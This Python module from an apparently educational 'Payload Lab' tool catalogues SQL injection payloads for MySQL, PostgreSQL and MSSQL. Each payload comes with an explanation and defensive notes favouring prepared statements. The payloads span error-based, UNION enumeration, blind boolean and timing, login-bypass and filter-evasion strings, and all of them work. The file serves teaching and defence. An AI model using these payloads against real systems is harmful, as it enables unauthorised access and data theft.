"""
Payload Lab - SQL Injection Module
Educational SQL injection payload templates for authorized testing only

⚠️ SIMULATION MODE ONLY - NO DATABASE EXECUTION

Reference: OWASP SQL Injection Guide
"""

from typing import List
from ..core.models import SQLiPayload


class SQLiModule:
    """SQL injection payload template generator for educational purposes"""
    
    @staticmethod
    def get_all_payloads(db: str = None) -> List[SQLiPayload]:
        """
        Get all SQLi payload templates
        
        Args:
            db: Filter by database type (mysql, postgres, mssql) or None for all
        
        Returns:
            List of SQL injection payload templates
        """
        payloads = []
        
        # Error-based SQLi
        payloads.extend(SQLiModule._get_error_based_payloads())
        
        # Union-based SQLi
        payloads.extend(SQLiModule._get_union_based_payloads())
        
        # Boolean-based blind SQLi
        payloads.extend(SQLiModule._get_boolean_blind_payloads())
        
        # Time-based blind SQLi
        payloads.extend(SQLiModule._get_time_based_payloads())
        
        # Authentication bypass
        payloads.extend(SQLiModule._get_auth_bypass_payloads())
        
        # Filter bypass techniques
        payloads.extend(SQLiModule._get_bypass_payloads())
        
        # Filter by database if specified
        if db:
            payloads = [p for p in payloads if p.db == db.lower() or p.db == "generic"]
        
        return payloads
    
    @staticmethod
    def _get_error_based_payloads() -> List[SQLiPayload]:
        """Error-based SQL injection templates"""
        return [
            SQLiPayload(
                id="sqli-001",
                category="sqli",
                db="generic",
                injection_type="error-based",
                template="' OR '1'='1",
                explanation="Classic SQL injection - creates always-true condition to bypass WHERE clause",
                defensive_notes="Parameterized queries (prepared statements) prevent this entirely. Never concatenate user input into SQL."
            ),
            SQLiPayload(
                id="sqli-002",
                category="sqli",
                db="generic",
                injection_type="error-based",
                template="' OR 1=1--",
                explanation="Boolean-based injection with comment - comments out rest of query",
                defensive_notes="Prepared statements are the primary defense. Input validation as secondary layer."
            ),
            SQLiPayload(
                id="sqli-003",
                category="sqli",
                db="mysql",
                injection_type="error-based",
                template="' OR '1'='1' #",
                explanation="MySQL-specific comment syntax using # to terminate query",
                defensive_notes="Use mysqli::prepare() or PDO with prepared statements. Never use mysql_query() with user input."
            ),
            SQLiPayload(
                id="sqli-004",
                category="sqli",
                db="mssql",
                injection_type="error-based",
                template="' OR 1=1;--",
                explanation="MSSQL semicolon query terminator with comment",
                defensive_notes="Use SqlCommand with parameters in .NET. Avoid dynamic SQL construction."
            ),
            SQLiPayload(
                id="sqli-005",
                category="sqli",
                db="postgres",
                injection_type="error-based",
                template="' OR '1'='1' --",
                explanation="PostgreSQL double-dash comment (note space after --)",
                defensive_notes="Use $1, $2 parameterization in PostgreSQL. Library: pg with parameterized queries."
            ),
            SQLiPayload(
                id="sqli-006",
                category="sqli",
                db="mysql",
                injection_type="error-based",
                template="' AND extractvalue(1,concat(0x7e,database())) --",
                explanation="MySQL error-based data extraction using extractvalue() function",
                defensive_notes="Prepared statements prevent injection. Additionally, principle of least privilege limits database access."
            ),
        ]
    
    @staticmethod
    def _get_union_based_payloads() -> List[SQLiPayload]:
        """Union-based SQL injection templates"""
        return [
            SQLiPayload(
                id="sqli-101",
                category="sqli",
                db="generic",
                injection_type="union-based",
                template="' UNION SELECT NULL,NULL,NULL--",
                explanation="UNION injection to discover column count - each NULL represents a column",
                defensive_notes="Prepared statements block this. If dynamic SQL is unavoidable, strict whitelist validation is needed."
            ),
            SQLiPayload(
                id="sqli-102",
                category="sqli",
                db="mysql",
                injection_type="union-based",
                template="' UNION SELECT 1,database(),user()--",
                explanation="MySQL UNION to extract database name and current user",
                defensive_notes="Defense-in-depth: prepared statements + least privilege database user + WAF monitoring."
            ),
            SQLiPayload(
                id="sqli-103",
                category="sqli",
                db="postgres",
                injection_type="union-based",
                template="' UNION SELECT NULL,current_database(),current_user--",
                explanation="PostgreSQL UNION for information disclosure",
                defensive_notes="Use parameterized queries exclusively. Avoid INFORMATION_SCHEMA access for app user."
            ),
            SQLiPayload(
                id="sqli-104",
                category="sqli",
                db="mssql",
                injection_type="union-based",
                template="' UNION SELECT NULL,@@version,NULL--",
                explanation="MSSQL version disclosure via UNION",
                defensive_notes="Parameterized queries in SqlCommand. Restrict database permissions for application account."
            ),
            SQLiPayload(
                id="sqli-105",
                category="sqli",
                db="mysql",
                injection_type="union-based",
                template="' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
                explanation="UNION-based table name enumeration from information_schema",
                defensive_notes="Prepared statements + restrict information_schema access + monitor for enumeration attempts."
            ),
        ]
    
    @staticmethod
    def _get_boolean_blind_payloads() -> List[SQLiPayload]:
        """Boolean-based blind SQL injection templates (description-only)"""
        return [
            SQLiPayload(
                id="sqli-201",
                category="sqli",
                db="generic",
                injection_type="blind-boolean",
                template="' AND 1=1--",
                explanation="Blind boolean SQLi - true condition (page behaves normally)",
                defensive_notes="Blind SQLi is harder to detect but still prevented by prepared statements. Monitor for repeated similar requests."
            ),
            SQLiPayload(
                id="sqli-202",
                category="sqli",
                db="generic",
                injection_type="blind-boolean",
                template="' AND 1=2--",
                explanation="Blind boolean SQLi - false condition (page behaves differently)",
                defensive_notes="Rate limiting and anomaly detection can identify blind SQLi attempts. Primary defense: prepared statements."
            ),
            SQLiPayload(
                id="sqli-203",
                category="sqli",
                db="mysql",
                injection_type="blind-boolean",
                template="' AND SUBSTRING(database(),1,1)='a'--",
                explanation="Blind SQLi character extraction - tests if first character of database name is 'a'",
                defensive_notes="This demonstrates data exfiltration byte-by-byte. Prepared statements prevent the injection point."
            ),
            SQLiPayload(
                id="sqli-204",
                category="sqli",
                db="mysql",
                injection_type="blind-boolean",
                template="' AND ASCII(SUBSTRING(database(),1,1))>97--",
                explanation="Blind binary search SQLi - compares ASCII value to narrow down characters",
                defensive_notes="Monitoring for sequential boolean testing patterns can detect blind SQLi automation. Prevent with parameterization."
            ),
        ]
    
    @staticmethod
    def _get_time_based_payloads() -> List[SQLiPayload]:
        """Time-based blind SQL injection templates (description-only, DO NOT EXECUTE)"""
        return [
            SQLiPayload(
                id="sqli-301",
                category="sqli",
                db="mysql",
                injection_type="blind-time",
                template="' AND SLEEP(5)--",
                explanation="MySQL time delay - causes 5-second delay if injection succeeds (DESCRIPTION ONLY - DO NOT EXECUTE)",
                defensive_notes="Time-based attacks are stealthy but detectable via response time monitoring. Prevent with prepared statements."
            ),
            SQLiPayload(
                id="sqli-302",
                category="sqli",
                db="postgres",
                injection_type="blind-time",
                template="'; SELECT pg_sleep(5)--",
                explanation="PostgreSQL time delay using pg_sleep() (DESCRIPTION ONLY)",
                defensive_notes="Database activity monitoring can detect unusual sleep operations. Core defense: parameterized queries."
            ),
            SQLiPayload(
                id="sqli-303",
                category="sqli",
                db="mssql",
                injection_type="blind-time",
                template="'; WAITFOR DELAY '00:00:05'--",
                explanation="MSSQL time delay using WAITFOR (DESCRIPTION ONLY)",
                defensive_notes="WAITFOR commands are suspicious in web contexts. Monitor for these + use prepared statements."
            ),
            SQLiPayload(
                id="sqli-304",
                category="sqli",
                db="mysql",
                injection_type="blind-time",
                template="' AND IF(1=1,SLEEP(5),0)--",
                explanation="Conditional time delay - sleeps only if condition is true (DESCRIPTION ONLY)",
                defensive_notes="Demonstrates data exfiltration via timing. Defense: prepared statements + query timeout limits."
            ),
        ]
    
    @staticmethod
    def _get_auth_bypass_payloads() -> List[SQLiPayload]:
        """Authentication bypass SQL injection templates"""
        return [
            SQLiPayload(
                id="sqli-401",
                category="sqli",
                db="generic",
                injection_type="auth-bypass",
                template="admin'--",
                explanation="Classic admin authentication bypass - comments out password check",
                defensive_notes="Prepared statements prevent this. Additionally: proper password hashing, account lockout, MFA."
            ),
            SQLiPayload(
                id="sqli-402",
                category="sqli",
                db="generic",
                injection_type="auth-bypass",
                template="' OR '1'='1'--",
                explanation="Always-true condition to bypass login - returns first user (often admin)",
                defensive_notes="Never build authentication queries with string concatenation. Use ORM or prepared statements."
            ),
            SQLiPayload(
                id="sqli-403",
                category="sqli",
                db="generic",
                injection_type="auth-bypass",
                template="admin' #",
                explanation="MySQL comment-based auth bypass",
                defensive_notes="Defense layers: prepared statements, rate limiting, CAPTCHA after failed attempts, logging."
            ),
            SQLiPayload(
                id="sqli-404",
                category="sqli",
                db="generic",
                injection_type="auth-bypass",
                template="' OR 1=1 LIMIT 1--",
                explanation="LIMIT clause to ensure single result in auth bypass",
                defensive_notes="Prepared statements + secure session management + monitoring for suspicious logins."
            ),
        ]
    
    @staticmethod
    def _get_bypass_payloads() -> List[SQLiPayload]:
        """Filter bypass technique demonstrations (strings only)"""
        return [
            SQLiPayload(
                id="sqli-501",
                category="sqli",
                db="generic",
                injection_type="filter-bypass",
                template="' OR '1'='1",
                explanation="No comment needed if query structure allows - demonstrates basic filter evasion",
                defensive_notes="Blacklist filters are ineffective. Whitelist validation + prepared statements required."
            ),
            SQLiPayload(
                id="sqli-502",
                category="sqli",
                db="mysql",
                injection_type="filter-bypass",
                template="' /*!50000OR*/ '1'='1",
                explanation="MySQL conditional comment bypass - code inside executes only on MySQL 5.0+",
                defensive_notes="Demonstrates why blacklisting fails. Use prepared statements, not regex filters."
            ),
            SQLiPayload(
                id="sqli-503",
                category="sqli",
                db="mysql",
                injection_type="filter-bypass",
                template="' OR/**/1=1--",
                explanation="Comment-based space replacement - bypasses filters looking for ' OR ' with spaces",
                defensive_notes="Attackers use many obfuscation tricks. Don't rely on pattern matching for SQL injection defense."
            ),
            SQLiPayload(
                id="sqli-504",
                category="sqli",
                db="generic",
                injection_type="filter-bypass",
                template="' OORR '1'='1",
                explanation="Demonstrates recursive filter bypass logic - if filter removes OR, this becomes ' OR '1'='1",
                defensive_notes="Recursive sanitization or proper prepared statements needed. String replacement is insufficient."
            ),
            SQLiPayload(
                id="sqli-505",
                category="sqli",
                db="mysql",
                injection_type="filter-bypass",
                template="' UnIoN SeLeCt 1,2,3--",
                explanation="Case variation to bypass case-sensitive filters",
                defensive_notes="Filters should be case-insensitive. Better: use prepared statements, not filters."
            ),
            SQLiPayload(
                id="sqli-506",
                category="sqli",
                db="mysql",
                injection_type="filter-bypass",
                template="' OR 0x31=0x31--",
                explanation="Hex encoding of values (0x31 = '1') to evade simple pattern matching",
                defensive_notes="Modern WAFs normalize hex encoding. Core defense remains prepared statements."
            ),
            SQLiPayload(
                id="sqli-507",
                category="sqli",
                db="generic",
                injection_type="filter-bypass",
                template="' OR CHAR(49)=CHAR(49)--",
                explanation="Character code encoding to hide suspicious values",
                defensive_notes="Demonstrates why signatures fail. Prepared statements treat entire input as data, not code."
            ),
        ]
    
    @staticmethod
    def get_by_database(db: str) -> List[SQLiPayload]:
        """
        Get payloads filtered by database type
        
        Args:
            db: mysql, postgres, mssql, or generic
        
        Returns:
            Filtered list of SQLi payloads
        """
        all_payloads = SQLiModule.get_all_payloads()
        return [p for p in all_payloads if p.db == db.lower() or p.db == "generic"]
    
    @staticmethod
    def get_by_type(injection_type: str) -> List[SQLiPayload]:
        """
        Get payloads filtered by injection type
        
        Args:
            injection_type: error-based, union-based, blind-boolean, blind-time, auth-bypass, filter-bypass
        
        Returns:
            Filtered list of SQLi payloads
        """
        all_payloads = SQLiModule.get_all_payloads()
        return [p for p in all_payloads if p.injection_type == injection_type]
